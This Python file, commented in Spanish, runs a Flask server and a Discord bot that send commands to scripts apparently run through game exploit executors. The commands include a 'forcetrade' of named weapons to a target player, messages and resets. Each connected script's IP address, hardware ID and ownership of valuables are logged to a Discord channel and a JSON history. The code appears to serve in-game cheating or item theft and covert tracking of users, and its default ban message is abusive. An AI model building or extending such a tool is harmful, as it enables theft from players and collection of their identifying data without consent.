import os
import threading
import time
import json
import discord
from discord.ext import commands
from dotenv import load_dotenv
from flask import Flask, jsonify, request
import requests

# Carga las variables de entorno
load_dotenv()

# ==========================================
# CONFIGURACIÓN DE ARCHIVOS JSON (BANS Y LOGS)
# ==========================================
BANS_FILE = "bans.json"
IP_BANS_FILE = "ip_bans.json"
HISTORIAL_FILE = "registros_usuarios.json"

def cargar_json(archivo):
    if os.path.exists(archivo):
        try:
            with open(archivo, "r") as f:
                return json.load(f)
        except:
            return {}
    return {}

def guardar_json(archivo, datos):
    try:
        with open(archivo, "w") as f:
            json.dump(datos, f, indent=4)
    except Exception as e:
        print(f"Error al guardar {archivo}: {e}")

usuarios_baneados = cargar_json(BANS_FILE)
ips_baneadas = cargar_json(IP_BANS_FILE)
historial_usuarios = cargar_json(HISTORIAL_FILE)

# ==========================================
# CONFIGURACIÓN DE WEBHOOK Y CANALES
# ==========================================
WEBHOOK_ACTIVOS_URL = os.getenv("WEBHOOK_ACTIVOS_URL", "")
MESSAGE_ID_ACTIVOS = os.getenv("MESSAGE_ID_ACTIVOS", "")
CANAL_BANEOS_ID = 1561319331063791796  # Canal de comandos de baneo
CANAL_HWID_LOGS = 1561327111581466666   # Nuevo canal donde se enviarán las HWIDs e IPs

# ==========================================
# 1. SERVIDOR WEB (FLASK) Y PANEL DE ACTIVOS
# ==========================================
app = Flask(__name__)

comandos_activos = {}
cuentas_activas = {}


@app.route("/")
def home():
  return "Miguelito runs u."


@app.route("/check", methods=["GET"])
def check_commands():
  ahora = time.time()
  comandos_validos = []

  for cmd_id, info in list(comandos_activos.items()):
    if ahora - info["timestamp"] < 10:
      comandos_validos.append(info["comando"])
    else:
      comandos_activos.pop(cmd_id, None)

  return jsonify({"commands": comandos_validos})


@app.route("/heartbeat", methods=["POST"])
def heartbeat():
  data = request.json
  if data and "username" in data:
    username = data["username"].strip().lower()
    hwid = data.get("hwid", "Desconocido")
    executor = data.get("executor", "Desconocido")
    
    # Obtener IP real
    ip_usuario = request.headers.get("X-Forwarded-For", request.remote_addr)
    if "," in ip_usuario:
        ip_usuario = ip_usuario.split(",")[0].strip()

    # Verificar si el usuario o la IP están baneados
    razon_ban = None
    if username in usuarios_baneados:
        razon_ban = usuarios_baneados[username]
    elif ip_usuario in ips_baneadas:
        razon_ban = ips_baneadas[ip_usuario]

    if razon_ban:
        return jsonify({"status": "banned", "reason": razon_ban}), 403

    tiene_valiosos = data.get("tiene_valiosos", False)
    cuentas_activas[username] = {
        "time": time.time(),
        "tiene_valiosos": tiene_valiosos,
        "ip": ip_usuario,
        "hwid": hwid,
        "executor": executor
    }
  return jsonify({"status": "ok"})


def run_flask():
  puerto = int(os.environ.get("PORT", 3000))
  app.run(host="0.0.0.0", port=puerto)


# ==========================================
# TAREA EN SEGUNDO PLANO: PANEL DE ACTIVOS Y LOGS HWID (ANTI-SPAM)
# ==========================================
def bucle_actualizar_panel():
  global bot
  while not bot.is_ready():
    time.sleep(1)

  canal_logs = bot.get_channel(CANAL_HWID_LOGS)

  while True:
    time.sleep(10)
    try:
      ahora = time.time()
      fuera = [
          usr for usr, info in cuentas_activas.items() if ahora - info["time"] > 60
      ]
      for usr in fuera:
        cuentas_activas.pop(usr, None)

      lineas_cuentas = []
      for usr, info in sorted(cuentas_activas.items()):
        fuego = "🔥 " if info["tiene_valiosos"] else ""
        ip_actual = info.get("ip", "Desconocida")
        hwid_actual = info.get("hwid", "N/A")
        exec_actual = info.get("executor", "N/A")
        
        lineas_cuentas.append(f"• `{usr}` | IP: `{ip_actual}` | HWID: `{hwid_actual}` {fuego}(Activo)")

        # Lógica Anti-Spam: Verificar si el usuario ya tiene registro o si cambió de IP/HWID
        registrar_cambio = False
        if usr not in historial_usuarios:
            historial_usuarios[usr] = {
                "hwid": hwid_actual,
                "ips": [ip_actual],
                "executor": exec_actual
            }
            registrar_cambio = True
        else:
            datos_guardados = historial_usuarios[usr]
            
            if datos_guardados.get("hwid") != hwid_actual:
                datos_guardados["hwid"] = hwid_actual
                registrar_cambio = True
                
            if ip_actual not in datos_guardados.get("ips", []):
                datos_guardados["ips"].append(ip_actual)
                registrar_cambio = True
                
            datos_guardados["executor"] = exec_actual

        if registrar_cambio:
            guardar_json(HISTORIAL_FILE, historial_usuarios)
            if canal_logs:
                ips_str = ", ".join(historial_usuarios[usr]["ips"])
                bot.loop.create_task(canal_logs.send(
                    f"🛡️ **Registro Actualizado / Nueva IP o HWID**\n"
                    f"• **Usuario:** `{usr}`\n"
                    f"• **IPs registradas:** `{ips_str}`\n"
                    f"• **HWID:** `{hwid_actual}`\n"
                    f"• **Ejecutor:** `{exec_actual}`"
                ))

      if not lineas_cuentas:
        texto_cuentas = "(No hay cuentas conectadas actualmente)"
      else:
        texto_cuentas = "\n".join(lineas_cuentas)

      tiempo_actual = time.strftime("%H:%M:%S", time.localtime())

      if WEBHOOK_ACTIVOS_URL and MESSAGE_ID_ACTIVOS:
          embed = {
              "title": "🟢 Panel de Monitoreo de Bots Activos",
              "description": "Estado en tiempo real de las cuentas ejecutando el script.",
              "color": 65280,
              "fields": [{
                  "name": f"Cuentas Online ({len(cuentas_activas)})",
                  "value": texto_cuentas,
                  "inline": False,
              }],
              "footer": {"text": f"Última actualización: {tiempo_actual}"},
          }
          requests.patch(f"{WEBHOOK_ACTIVOS_URL}/messages/{MESSAGE_ID_ACTIVOS}", json={"embeds": [embed]}, timeout=5)

    except Exception as e:
      print(f"Error en bucle panel: {e}")


# ==========================================
# 2. BOT DE DISCORD Y COMANDOS
# ==========================================
intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix="-", intents=intents)


def registrar_comando(comando_dict):
  cmd_id = str(time.time())
  comandos_activos[cmd_id] = {"timestamp": time.time(), "comando": comando_dict}


@bot.event
async def on_ready():
  print(f"✅ Bot de Discord {bot.user} conectado correctamente!")
  threading.Thread(target=bucle_actualizar_panel, daemon=True).start()


@bot.command()
async def trade(ctx, arma: str, bot_ejecutor: str):
  if ctx.channel.id != CANAL_BANEOS_ID:
      return
  registrar_comando({
      "action": "forcetrade",
      "target_weapon": arma.strip().lower(),
      "target_player": bot_ejecutor.strip().lower(),
  })
  embed = discord.Embed(
      title="🎯 MODO ESTRICTO ACTIVADO",
      description=f"La orden fue enviada a la cuenta **{bot_ejecutor}** con el arma `{arma}`.",
      color=discord.Color.green(),
  )
  await ctx.send(embed=embed)


@bot.command()
async def text(ctx, player: str, *, mensaje: str):
  if ctx.channel.id != CANAL_BANEOS_ID:
      return
  registrar_comando({
      "action": "text",
      "message": mensaje,
      "target_player": player.strip().lower(),
  })
  await ctx.send(f"✅ Mensaje enviado a **{player}**: `{mensaje}`")


@bot.command()
async def reset(ctx, player: str = "all"):
  if ctx.channel.id != CANAL_BANEOS_ID:
      return
  registrar_comando({"action": "reset", "target_player": player.strip().lower()})
  await ctx.send(f"🔄 Reiniciando el script para: **{player}**...")


@bot.command()
async def ban(ctx, usuario: str, *, razon: str = "Jajaja pendejo me pelas la verga"):
    if ctx.channel.id != CANAL_BANEOS_ID:
        return
    user_clean = usuario.strip().lower()
    usuarios_baneados[user_clean] = razon
    guardar_json(BANS_FILE, usuarios_baneados)
    
    embed = discord.Embed(title="🔨 USUARIO BANEADO", description=f"El usuario **{usuario}** ha sido baneado permanentemente.", color=discord.Color.red())
    embed.add_field(name="Razón", value=razon, inline=False)
    await ctx.send(embed=embed)


@bot.command()
async def unban(ctx, usuario: str):
    if ctx.channel.id != CANAL_BANEOS_ID:
        return
    user_clean = usuario.strip().lower()
    if user_clean in usuarios_baneados:
        usuarios_baneados.pop(user_clean)
        guardar_json(BANS_FILE, usuarios_baneados)
        await ctx.send(f"✅ El usuario **{usuario}** ha sido desbaneado.")
    else:
        await ctx.send(f"⚠️ El usuario no estaba en la lista.")


@bot.command()
async def ipban(ctx, ip: str, *, razon: str = "IP bloqueada por seguridad"):
    if ctx.channel.id != CANAL_BANEOS_ID:
        return
    ip_clean = ip.strip()
    ips_baneadas[ip_clean] = razon
    guardar_json(IP_BANS_FILE, ips_baneadas)
    
    embed = discord.Embed(title="🌐 IP BANEADA", description=f"La IP **{ip_clean}** ha sido bloqueada.", color=discord.Color.red())
    embed.add_field(name="Razón", value=razon, inline=False)
    await ctx.send(embed=embed)


@bot.command()
async def ipunban(ctx, ip: str):
    if ctx.channel.id != CANAL_BANEOS_ID:
        return
    ip_clean = ip.strip()
    if ip_clean in ips_baneadas:
        ips_baneadas.pop(ip_clean)
        guardar_json(IP_BANS_FILE, ips_baneadas)
        await ctx.send(f"✅ La IP **{ip_clean}** ha sido desbaneada.")
    else:
        await ctx.send(f"⚠️ La IP no estaba en la lista de baneos.")


@bot.command()
async def banlist(ctx):
    if ctx.channel.id != CANAL_BANEOS_ID:
        return
    if not usuarios_baneados and not ips_baneadas:
        await ctx.send("📋 Las listas de baneos están vacías.")
        return

    embed = discord.Embed(title="📋 Lista de Baneos (Usuarios e IPs)", color=discord.Color.orange())
    desc = ""
    for usr, r in usuarios_baneados.items():
        desc += f"• **Usuario:** `{usr}` | Razón: {r}\n"
    for ip, r in ips_baneadas.items():
        desc += f"• **IP:** `{ip}` | Razón: {r}\n"

    embed.description = desc[:1990]
    await ctx.send(embed=embed)


# ==========================================
# 3. EJECUCIÓN MULTIHILO (FLASK + BOT)
# ==========================================
if __name__ == "__main__":
  TOKEN = os.getenv("DISCORD_TOKEN")
  if not TOKEN:
    raise ValueError("❌ No se encontró el DISCORD_TOKEN.")

  threading.Thread(target=run_flask, daemon=True).start()
  bot.run(TOKEN)
